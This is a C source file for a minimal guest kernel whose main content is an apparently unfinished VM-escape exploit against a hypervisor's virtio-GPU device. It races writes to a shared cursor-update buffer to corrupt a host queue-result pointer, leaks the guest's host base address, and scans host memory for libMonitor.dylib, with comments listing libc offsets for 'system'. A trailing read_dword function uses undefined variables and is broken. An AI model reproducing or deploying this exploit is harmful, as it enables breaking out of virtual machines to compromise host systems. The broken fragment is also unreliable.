#include <stdio.h>
#include <pmm.h>
#include <trap.h>
#include <x86.h>
#include <picirq.h>
#include <clock.h>
#include <multiboot.h>
#include <heap.h>
#include <pci.h>
#include <keyboard.h>
#include <virtio_dev.h>
#include <physical_page.h>
#include <smp.h>
#include <virtio_gpu.h>
#include <virtio.h>
#include <smb.h>
void cga_init(){
    for(int i=0;i<80;i++){
        kprintf("\n");
    }
    set_cursor(0,0);
}

void intr_enable(){
    sti();
}

void intr_disable(){
    cli();
}


void kern_init(multiboot_info_t* mbd, unsigned int magic){
    extern char bss_start[],bss_end[];
    memset(bss_start,0,bss_end-bss_start);
    cga_init();
    pmm_init();
    pic_init(); // if not, os will stuck by int 13
    clock_init();
    keyboard_init();
    intr_init();

    heap_init((uint8_t*)0x200000,0x100000);

    physical_page_init((uint8_t*)0x300000,0x500000);
    intr_enable();

    pci_init();
    virtio_dev_install();
    smb_init();

    void bug_trigger();
    
    start_thread();

    while(1){
        char op = get_c();
        switch(op){
            case 'a':
                kprintf("call trigger\n");
                bug_trigger();
                break;
            case 'b':
                outb(0xe200,0x12);// smb io port
                break;
        }
    }
}


void helloworld(){
    kprintf("output helloworld\n");
}
void create_task(void (*p)(void*),void* arg){
    task = p;
    task_arg = arg;
    UNLOCK(taskLock);
    while(task){
        cpu_relax();
    }
    LOCK(taskLock);
}

struct virtio_gpu_update_cursor ppp;
struct shr_info{
    uint32_t done;
    uint32_t mem;
    uint32_t offset;
};
struct shr_1{
    uint64_t addr;
    uint64_t *ptr;
    uint32_t done;
};

struct queue_result {
    uint32_t next_buf;
    uint32_t buf_count;
    struct {
        uint64_t hva;
        uint64_t gpa;
        uint64_t length;
    } mem_handlers[3];
    uint64_t idx_1_addr;
    uint64_t idx_1_length;
    uint64_t output_gpa;
    uint64_t output_length;
};

void overwrite_dword(void* ptr);
void race_write(void* ptr);
extern virtio_device* gpu_dev;
void bug_trigger(){
    virtio_device* vdev = gpu_dev;
    virtq_desc desc;
    memset(&ppp,'a',sizeof(ppp));
    kprintf("ppp addr: %x\n",&ppp);
    struct shr_info info;
    memset(&info,0,sizeof(info));
    info.done = 0;
    info.offset = 4651; // queue result high ptr
    info.mem = (uint32_t)&ppp.pos.scanout_id;
    uint64_t fake_hva = 0x180000000;
    create_task(overwrite_dword,&info);
    for(int i=0;i<0x100;i++){
        ppp.pos.scanout_id = 0;
        ppp.hdr.type = 0x300;
        ppp.resource_id = fake_hva>>32; // 0x1f0000000 <- maybe guest memory
        desc.flags = 0;
        desc.address = (uint32_t)&ppp;
        desc.length = sizeof(ppp);
        virtio_fill_buffer(vdev,1,&desc,1,0); // don't copy
    }
    info.done = 1;
    while(info.done != -1){
        cpu_relax();
    }

    info.done = 0;
    info.offset = 4650;
    create_task(overwrite_dword,&info);

    for(int i=0;i<0x100;i++){
        ppp.pos.scanout_id = 0;
        ppp.hdr.type = 0x300;
        ppp.resource_id = fake_hva&0xffffffff; // 0x1f0000000 <- maybe guest memory
        desc.flags = 0;
        desc.address = (uint32_t)&ppp;
        desc.length = sizeof(ppp);
        virtio_fill_buffer(vdev,1,&desc,1,0); // don't copy
    }
    info.done = 1;
    while(info.done != -1){
        cpu_relax();
    }
    kprintf("overwrite control queue result addr done, check now\n");
    // find the target addr in memory
    uint32_t search_ptr = 0x01000000;
    uint32_t search_end = 0xb0000000;
    uint64_t guest_base = 0;
    while(search_ptr < search_end){
        if(*(uint32_t*)search_ptr == 0xfffffffe){
            kprintf("find target addr at: 0x%x\n",search_ptr);
            guest_base = fake_hva - (uint64_t)search_ptr;
            break;
        }
        search_ptr += 0x1000;
    }
    if(search_ptr == search_end){
        kprintf("can't find target addr\n");
        return;
    }
    kprintf("Guest base addr: 0x%x",guest_base>>32);
    kprintf("%x\n",guest_base);
    get_c();
    struct queue_result* qr = (struct queue_result*)search_ptr;
    // uint64_t leak_ptr = guest_base + 0x100000000;
    // uint64_t leak_ptr_end = guest_base + 0x100000000 + 0x20000;
    virtq_desc desc2[3];

    char buffer[0x100];
    memset(buffer,'a',sizeof(buffer));

    /*
    0xfffff000<-----0x77a000 |---Guest Memory---| 0x100000-----> 0xfffff000
    4G memory
    */
    // find libMonitor.dylib
    uint64_t left_addr = guest_base - 0x77a000;
    uint64_t right_addr = guest_base + 0x100000000;
    int offset = 0;
    uint64_t leak_addr;
    while(1){
        // while(leak_ptr < leak_ptr_end){
        /* read addr */
        // kprintf("offset : %d\n",offset);
        if (offset % 2){
            leak_addr = left_addr - (offset/2)*0x1000;
        }else{
            leak_addr = right_addr + (offset/2)*0x1000;
        }
        offset++;
        struct shr_1 sh1;
        sh1.done = 0;
        sh1.addr = leak_addr + 0x4D10 - 4;
        sh1.ptr = &qr->mem_handlers[0].hva;
        qr->mem_handlers[0].hva = 0;
        create_task(race_write,&sh1);
        desc2[0].address = (uint32_t)buffer;
        desc2[0].flags = 0;
        desc2[0].length = sizeof(buffer);
        desc2[1].address = (uint32_t)buffer;
        desc2[1].flags = 0;
        desc2[1].length = sizeof(buffer);
        desc2[2].address = (uint32_t)buffer;
        desc2[2].flags = 2; // write flag
        desc2[2].length = 0x18;
        uint32_t* tmp_ptr = (uint32_t*)&buffer[4];
        *tmp_ptr = 0x61616161;

        // babysleep(5);
        for(int i=0;*tmp_ptr == 0x61616161;i++){
            virtio_fill_buffer(vdev,0,desc2,3,0);
            while(*(uint32_t*)buffer != 0x1200);
            *(uint32_t*)buffer = 0x61616161;
        }
        while(!sh1.done){
            cpu_relax();
        }
        // babysleep(5);
        // 41 52 41 53
        if(*tmp_ptr == 0x53415241){
            break;
        }
        if(offset % 0x100 == 0){
            uint64_t a = left_addr - (offset/2)*0x1000;
            uint64_t b = right_addr + (offset/2)*0x1000;
            kprintf("left addr: %x",a>>32);
            kprintf("%x\n",a);
            kprintf("right addr: %x",b>>32);
            kprintf("%x\n",b);
        }
    }
    kprintf("OK!find addr: %x",leak_addr>>32);
    kprintf("%x\n",leak_addr);
    uint64_t libmonitor_addr = leak_addr;

    // leak libc gettimeday 0x0000000000010b84
    // system 0x0000000000078d1d
    // search libMonitor.dylib base address

}
uint64_t read_dword(uint64_t addr){
    virtq_desc desc2[3];

    char buffer[0x20];
    memset(buffer,'a',sizeof(buffer));

        struct shr_1 sh1;
        sh1.done = 0;
        sh1.addr = leak_addr + 0x4D10 - 4;
        sh1.ptr = &qr->mem_handlers[0].hva;
        qr->mem_handlers[0].hva = 0;
        create_task(race_write,&sh1);
        desc2[0].address = (uint32_t)buffer;
        desc2[0].flags = 0;
        desc2[0].length = sizeof(buffer);
        desc2[1].address = (uint32_t)buffer;
        desc2[1].flags = 0;
        desc2[1].length = sizeof(buffer);
        desc2[2].address = (uint32_t)buffer;
        desc2[2].flags = 2; // write flag
        desc2[2].length = 0x18;
        uint32_t* tmp_ptr = (uint32_t*)&buffer[4];
        *tmp_ptr = 0x61616161;
}



void overwrite_dword(void* ptr){
    struct shr_info* info = ptr;
    while(!info->done){
        uint32_t* v = (uint32_t*)info->mem;
        uint32_t offset = info->offset;
        for(int i=0;i<0x100 && !info->done;i++){
            *v = 0;
            *v = offset;
        }
    }
    info->done = -1;
}

void race_write(void* ptr){
    struct shr_1* sh = (struct shr_1*)ptr;
    uint8_t* v = (uint8_t*)sh->ptr;
    // kprintf("watch address: %x\n",v);
    while(!*v){
        cpu_relax();
    }
    *sh->ptr = sh->addr;
    // kprintf("race write success\n");
    sh->done = 1;
}


